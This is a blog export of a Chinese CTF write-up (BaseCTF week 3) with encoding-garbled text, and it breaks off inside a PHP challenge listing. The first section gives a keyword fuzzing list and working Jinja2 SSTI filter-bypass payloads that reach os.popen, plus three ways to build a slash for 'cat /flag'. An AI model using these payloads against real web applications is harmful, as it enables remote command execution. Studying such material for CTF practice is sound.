<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BaseCTF wp(week3)</title>
      <link href="/2024/09/11/BaseCTF-week3/"/>
      <url>/2024/09/11/BaseCTF-week3/</url>
      
        <content type="html"><![CDATA[<h1 id="BaseCTF-wp-week3"><a href="#BaseCTF-wp-week3" class="headerlink" title="BaseCTF wp(week3)"></a>BaseCTF wp(week3)</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="å¤è¯»æœº"><a href="#å¤è¯»æœº" class="headerlink" title="å¤è¯»æœº"></a>å¤è¯»æœº</h3><p><del>è€æ¼”å‘˜äº†ï¼ˆï¼‰</del></p><p>fuzzæµ‹ä¸€ä¸‹è¿‡æ»¤äº†å•¥ï¼Œè¯¦ç»†è¯´ä¸€ä¸‹æµ‹è¯•è¿‡ç¨‹ï¼Œé˜²æ­¢è‡ªå·±å¿˜è®°æ€ä¹ˆæµ‹çš„äº†ï¼Œä¸‹é¢æ˜¯æµ‹è¯•ä½ç½®</p><p><img src="/2024/09/11/BaseCTF-week3/image-20240908150406865-17260327135671.png" alt="image-20240908150406865"></p><p>è´´ä¸€ä¸ªæµ‹è¯•å­—å…¸ï¼ˆä¸ªäººæ€»ç»“ï¼Œä¸ä¸€å®šå¥½ç”¨ï¼‰</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">.</span></span><br><span class="line"><span class="bullet"></span>[</span><br><span class="line">]</span><br><span class="line">_</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#123;&#123;</span><br><span class="line">&#125;&#125;</span><br><span class="line">&#123;%</span><br><span class="line">%&#125;</span><br><span class="line">&#123;%if</span><br><span class="line">&#123;%endif</span><br><span class="line">&#123;%print(</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">0</span><br><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">+</span><br><span class="line">%2B</span><br><span class="line">%2b</span><br><span class="line">join()</span><br><span class="line">u</span><br><span class="line">os</span><br><span class="line">popen</span><br><span class="line">importlib</span><br><span class="line">linecache</span><br><span class="line">subprocess</span><br><span class="line">|attr()</span><br><span class="line">request</span><br><span class="line">args</span><br><span class="line">value</span><br><span class="line">cookie</span><br><span class="line"><span class="emphasis">__getitem__</span>()</span><br><span class="line"><span class="emphasis">__class__</span></span><br><span class="line"><span class="emphasis">__base__</span></span><br><span class="line"><span class="emphasis">__bases__</span></span><br><span class="line"><span class="emphasis">__mro__</span></span><br><span class="line"><span class="emphasis">__subclasses__</span>()</span><br><span class="line"><span class="emphasis">__builtins__</span></span><br><span class="line"><span class="emphasis">__init__</span></span><br><span class="line"><span class="emphasis">__globals__</span></span><br><span class="line"><span class="emphasis">__import__</span></span><br><span class="line"><span class="emphasis">__dic__</span></span><br><span class="line"><span class="emphasis">__getattribute__</span>()</span><br><span class="line"><span class="emphasis">__getitem__</span>()</span><br><span class="line"><span class="emphasis">__str__</span>()</span><br><span class="line">lipsum</span><br><span class="line">current_app</span><br><span class="line">/</span><br><span class="line">\</span><br><span class="line">+</span><br><span class="line"><span class="bullet">-</span></span><br><span class="line"><span class="bullet"></span><span class="bullet">*</span></span><br><span class="line"><span class="bullet"></span>&#x27;</span><br><span class="line">&quot;</span><br><span class="line">base</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‘ç°å®ƒè¿‡æ»¤äº†</p><p><img src="/2024/09/11/BaseCTF-week3/image-20240911133741843.png" alt="image-20240911133741843"></p><img src="/2024/09/11/BaseCTF-week3/image-20240908150822508-17260327135683.png" alt="image-20240908150822508" style="zoom:50%;"><p>ç”±äºsstiä¸­å…³é”®å­—éƒ½éœ€è¦åŒå¤§æ‹¬å·è§£æï¼Œå¦‚è¿‡ä¸èƒ½è§£æåˆ™æµ‹ä¸åˆ°å®é™…çš„è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡ŒåŠæ—¶æ›¿æ¢æµ‹è¯•æ–¹æ³•ï¼Œé‡‡ç”¨</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="meta">%</span><span class="meta">%</span>&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä»£æ›¿è§£æå…³é”®å­—ï¼ˆåç»­é…åˆprintä½¿ç”¨ï¼‰</p><p>ç»“æœå¦‚ä¸‹ï¼Œè¿”å›åŒ…é•¿åº¦ä¸º205çš„å…¨éƒ¨éƒ½æ˜¯è¿‡æ»¤çš„å…³é”®å­—ç¬¦</p><img src="/2024/09/11/BaseCTF-week3/image-20240908151426279-17260327135682.png" alt="image-20240908151426279" style="zoom:50%;"><p>åˆ†æè¿‡æ»¤ç»“æœï¼Œå¯¹æˆ‘ä»¬å®é™…å¯»æ‰¾åˆ©ç”¨ç±»å’Œæœ€ç»ˆrceæœ‰å½±å“çš„è¿‡æ»¤å­—ç¬¦å¦‚ä¸‹</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base <span class="punctuation">+</span> <span class="punctuation">-</span> * / \ <span class="string">&quot; . &#123;&#123;&#125;&#125; : __ </span></span><br></pre></td></tr></table></figure><p>ä»¥åŠå‡ ä¹æ‰€æœ‰çš„å…³é”®å­—éƒ½è¢«è¿‡æ»¤äº†(è¿˜è¿‡æ»¤äº†popï¼Œåœ¨åé¢ç”¨â€™â€™åˆ†å‰²å­—ç¬¦ä¸²æ—¶æ³¨æ„)</p><p>ç»“åˆé¢˜ç›®æ€è€ƒï¼Œä½¿ç”¨è¿™æ¡é“¾å­å»rceæ¯”è¾ƒå¥½</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">BaseCTF</span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ ¹æ®è¿‡æ»¤å¼€å§‹ç»•è¿‡</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%print(<span class="string">&quot;&quot;</span>.__class__)%&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤åŒå¼•å·ï¼Œå¯ç”¨å•å¼•å·ç»•è¿‡ï¼›è¿‡æ»¤ç‚¹ï¼Œå¯ç”¨ä¸­æ‹¬å·ç»•è¿‡;è¿‡æ»¤__å’Œå…³é”®è¯ï¼Œå¯ç”¨â€™â€™æ‹¼æ¥</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%print(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cla&#x27;</span><span class="string">&#x27;ss_&#x27;</span><span class="string">&#x27;_&#x27;</span>])%&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ åˆ©ç”¨é“¾å¯»æ‰¾å¯åˆ©ç”¨ç±»ï¼Œé€šè¿‡è„šæœ¬æ¥å¯»æ‰¾rceç±»&lt;class â€˜os._wrap_closeâ€™&gt;ï¼Œä½ç½®åœ¨137ï¼ˆæ­¤å¤„å¼•å·åˆ†å‰²å­—ç¬¦ä¸²popenè¦åˆ†æˆpoâ€™â€™penï¼Œä»¥é¿å…è¢«æ£€æµ‹ä¸ºpopï¼‰</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%print(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cla&#x27;</span><span class="string">&#x27;ss_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcl&#x27;</span><span class="string">&#x27;asses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)[<span class="string">&#x27;re&#x27;</span><span class="string">&#x27;ad&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œ</p><p><img src="/2024/09/11/BaseCTF-week3/image-20240908155203425-17260327135684.png" alt="image-20240908155203425"></p><p>åˆ°äº†è¿™ä¸€æ­¥äº†ï¼Œå‘ç°rceé‡Œé¢çš„æ–œæ å’Œåæ–œæ éƒ½è¢«è¿‡æ»¤äº†ï¼Œç”±äºåæ–œæ çš„è¿‡æ»¤ï¼Œå…«è¿›åˆ¶åå…­è¿›åˆ¶æé™å‘½ä»¤æ‰§è¡Œå•¥çš„éƒ½ä¸è¡Œï¼›è¿‡æ»¤äº†baseï¼Œå°æ­»äº†æƒ³é€šè¿‡baseå†™é©¬è¿›æœåŠ¡å™¨çš„è¿™æ¡è·¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯å›åˆ°æœ€åˆçš„èµ·ç‚¹ï¼Œæƒ³åŠæ³•æ„é€ æ–œæ </p><p>ä¸€å…±æœ‰ä¸‰ç§æ–¹æ³•</p><p>æ–¹æ³•ä¸€ï¼šé€šè¿‡chr()æ„é€ </p><p><del>æ¯”èµ›çš„æ—¶å€™æ‰¾ä¸åˆ°chrå‡½æ•°ï¼Œæ‚²å‚¬äº†</del></p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">BaseCTF</span><span class="template-tag">&#123;%</span> <span class="name">set</span> chr= <span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cla&#x27;</span><span class="string">&#x27;ss_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcl&#x27;</span><span class="string">&#x27;asses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_buil&#x27;</span><span class="string">&#x27;tins_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;chr&#x27;</span>]<span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">print</span>(chr(<span class="number">47</span>)) <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å­å°±å‡‘äº†ä¸ªæ–œæ å‡ºæ¥å•¦</p><p><img src="/2024/09/11/BaseCTF-week3/image-20240908161122847-17260327135688.png" alt="image-20240908161122847"></p><p>æœ€ç»ˆpayload</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">BaseCTF</span><span class="template-tag">&#123;%</span> <span class="name">set</span> chr= <span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cla&#x27;</span><span class="string">&#x27;ss_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcl&#x27;</span><span class="string">&#x27;asses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_buil&#x27;</span><span class="string">&#x27;tins_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;chr&#x27;</span>]<span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">set</span> cmd = <span class="string">&#x27;cat &#x27;</span>~chr(<span class="number">47</span>)~<span class="string">&#x27;flag&#x27;</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span><span class="name">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cla&#x27;</span><span class="string">&#x27;ss_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcl&#x27;</span><span class="string">&#x27;asses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](cmd)[<span class="string">&#x27;re&#x27;</span><span class="string">&#x27;ad&#x27;</span>]())<span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure><img src="/2024/09/11/BaseCTF-week3/image-20240908161613163-17260327135685.png" alt="image-20240908161613163" style="zoom:50%;"><p>ä¸ºäº†é˜²æ­¢ä¸‹æ¬¡è¿˜æ˜¯æ‰¾ä¸åˆ°ï¼Œè¿™é‡Œè´´ä¸€ä¸ªæ‰¾chrå‡½æ•°çš„é“¾å­æ€»ç»“</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.<span class="strong">__class__</span>.<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()[x].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[&#x27;<span class="strong">__builtins__</span>&#x27;].chr</span><br><span class="line">get<span class="emphasis">_flashed_</span>messages.<span class="strong">__globals__</span>[&#x27;<span class="strong">__builtins__</span>&#x27;].chr</span><br><span class="line">url<span class="emphasis">_for.<span class="strong">__globals__</span>[&#x27;<span class="strong">__builtins__</span>&#x27;].chr</span></span><br><span class="line"><span class="emphasis">lipsum.<span class="strong">__globals__</span>[&#x27;<span class="strong">__builtins__</span>&#x27;].chr</span></span><br><span class="line"><span class="emphasis">x.<span class="strong">__init__</span>.<span class="strong">__globals__</span>[&#x27;<span class="strong">__builtins__</span>&#x27;].chr  (xä¸ºä»»æ„å€¼)</span></span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼šæŸ¥çœ‹ç¯å¢ƒå˜é‡ï¼Œé€šè¿‡ç¯å¢ƒå˜é‡ä¸­å¯èƒ½å­˜åœ¨çš„æ ¹ç›®å½•æ¥æ‰§è¡Œrce</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%print(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cla&#x27;</span><span class="string">&#x27;ss_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcl&#x27;</span><span class="string">&#x27;asses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;env&#x27;</span>)[<span class="string">&#x27;re&#x27;</span><span class="string">&#x27;ad&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><img src="/2024/09/11/BaseCTF-week3/image-20240908162224056-17260327135687.png" alt="image-20240908162224056" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°$OLDPWD&#x3D;&#x2F;</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå˜é‡æ¥æ„é€ rceè¯­å¥</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cla&#x27;</span><span class="string">&#x27;ss_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcl&#x27;</span><span class="string">&#x27;asses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;cd <span class="subst">$OLDPWD</span>;cat flag&#x27;</span>)[<span class="string">&#x27;re&#x27;</span><span class="string">&#x27;ad&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p>æ–¹æ³•ä¸‰ï¼š</p><p>é€šè¿‡expr substrå‘½ä»¤æ¥åˆ‡å‰²ç¯å¢ƒå˜é‡ä¸­çš„å­—ç¬¦ä¸²</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=`<span class="built_in">pwd</span>`;a=`<span class="built_in">expr</span> substr <span class="variable">$a</span> 1 1`;<span class="built_in">cd</span> <span class="variable">$a</span>;<span class="built_in">ls</span>  </span><br><span class="line"><span class="comment">#expr substr $a [ç´¢å¼•ä½ç½®] [æˆªå–é•¿åº¦] å‘½ä»¤ä¸­çš„ç´¢å¼•ä½ç½®æ˜¯ä»1å¼€å§‹çš„ï¼Œä¹Ÿå°±æ˜¯è¦è·å–ç¬¬ä¸€ä¸ªå­—ç¬¦éœ€è¦å¡«å…¥1</span></span><br></pre></td></tr></table></figure><p>æœ¬åœ°æ‰§è¡Œæ•ˆæœ</p><img src="/2024/09/11/BaseCTF-week3/image-20240908163248910-17260327135686.png" alt="image-20240908163248910" style="zoom:50%;"><p>ä¸Špayload</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cla&#x27;</span><span class="string">&#x27;ss_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcl&#x27;</span><span class="string">&#x27;asses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;a=`pwd`;a=`expr substr <span class="subst">$a</span> 1 1`;cd <span class="subst">$a</span>;cat flag&#x27;</span>)[<span class="string">&#x27;re&#x27;</span><span class="string">&#x27;ad&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><h3 id="æ»¤ä¸ªä¸åœ"><a href="#æ»¤ä¸ªä¸åœ" class="headerlink" title="æ»¤ä¸ªä¸åœ"></a>æ»¤ä¸ªä¸åœ</h3><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$incompetent</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;incompetent&#x27;</span>];</span><br><span class="line"><span class="variable">$Datch</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Datch&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$incompetent</span> !== <span class="string">&#x27;HelloWorld&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;å†™å‡ºç¨‹åºå‘˜çš„ç¬¬ä¸€è¡Œé—®å€™å§ï¼&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œä¸œï¼Ÿï¼Ÿï¼Ÿ</span></span><br><span class="line"><span class="variable">$required_chars</span> = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="variable">$is_valid</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$required_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$Datch</span>, <span class="variable">$char</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$is_valid</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$is_valid</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$invalid_patterns</span> = [<span class="string">&#x27;php://&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>, <span class="string">&#x27;ftp://&#x27;</span>, <span class="string">&#x27;file://&#x27;</span> , <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;gopher://&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$invalid_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$Datch</span>, <span class="variable">$pattern</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;æ­¤è·¯ä¸é€šæ¢æ¡è·¯è¯•è¯•?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$Datch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;æ–‡ä»¶åä¸åˆè§„ è¯·é‡è¯•&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>å…³é”®ä»£ç 1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$required_chars</span> = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="variable">$is_valid</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$required_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;  <span class="comment">//å¾ªç¯éå†required_charsä¸­çš„å€¼ï¼Œå¹¶ä¸”èµ‹å€¼ç»™$char</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$Datch</span>, <span class="variable">$char</span>) === <span class="literal">false</span>) &#123;<span class="comment">//æ£€æŸ¥$charæ˜¯å¦åœ¨$Datché‡Œ</span></span><br><span class="line">        <span class="variable">$is_valid</span> = <span 